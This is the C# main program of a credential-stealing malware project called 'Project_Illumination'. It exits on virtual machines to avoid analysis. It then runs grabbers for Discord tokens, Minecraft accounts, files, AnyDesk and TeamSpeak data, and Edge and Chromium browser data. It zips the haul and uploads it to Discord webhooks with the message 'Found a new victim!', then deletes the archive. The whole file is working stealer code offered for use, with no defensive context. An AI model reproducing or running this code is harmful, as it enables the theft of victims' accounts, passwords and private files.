using Project_Illumination.Exploits;
using Project_Illumination.Exploits.Browsers;
using Project_Illumination.Exploits.Programs;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading;
using System.Windows.Forms;
using Project_Illumination.Exploits.General;

namespace Project_Illumination
{
    internal class Program
    {
        // Add as many Webhooks as you want
        private static readonly string[] _WEBHOOKS = { "" };
        public static readonly bool _DEBUG = false;
        private static SystemInfo _systemInfo;

        public static void Main(string[] args)
        {
            if (_DEBUG) return;
            if (IsVM())
            {
                Application.Exit();
                return;
            }

            if (Directory.Exists(Paths.SAVE_PATH)) Directory.Delete(Paths.SAVE_PATH, true);
            Directory.CreateDirectory(Paths.SAVE_PATH);

            var threads = new List<Thread>
            {
                new Thread(() =>
                {
                    _systemInfo = new SystemInfo();
                    _systemInfo.Run();

                    new DiscordGrabber().Run();
                    new MinecraftStealer().Run();
                    new FileFinder().Run();
                    new AnyDesk().Run();
                    new TeamSpeak().Run();
                })
            };

            IBrowser[] browsers = { new Edge(), new Chromium() };
            threads.AddRange(browsers.Select(browser => new Thread(browser.Run)));

            foreach (var t in threads) t.Start();
            foreach (var t in threads) t.Join();

            var fileName = _systemInfo.HWID != "Unknown." ? _systemInfo.HWID : DateTime.Now.ToString("dd_MM_yyyy_HH_mm");
            if (File.Exists($@"{Paths.TMP}\{fileName}.zip")) File.Delete($@"{Paths.TMP}\{fileName}.zip");

            ZipFile.CreateFromDirectory(Paths.SAVE_PATH, $@"{Paths.TMP}\{fileName}.zip");
            Directory.Delete(Paths.SAVE_PATH, true);

            using var httpClient = new HttpClient {Timeout = TimeSpan.FromSeconds(10)};

            using var form = new MultipartFormDataContent();
            var bytes = File.ReadAllBytes($@"{Paths.TMP}\{fileName}.zip");

            form.Add(new StringContent("@everyone **Found a new victim! Here is some mystery package for you.**"), "content");
            form.Add(new ByteArrayContent(bytes, 0, bytes.Length), "file", $@"{Paths.TMP}\{fileName}.zip");
            httpClient.PostAsync(_WEBHOOKS[new Random().Next(_WEBHOOKS.Length)], form).Wait();

            File.Delete($@"{Paths.TMP}\{fileName}.zip");
            Paths.DisposePaths();
        }

        private static bool IsVM()
        {
            using var searcher = new System.Management.ManagementObjectSearcher("Select Manufacturer,Model from Win32_ComputerSystem");
            using var items = searcher.Get();
            foreach (var item in items)
            {
                var manufacturer = item["Manufacturer"].ToString().ToLower();
                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                    || manufacturer.Contains("vmware")
                    || item["Model"].ToString() == "VirtualBox")
                {
                    return true;
                }
            }

            return false;
        }
    }
}
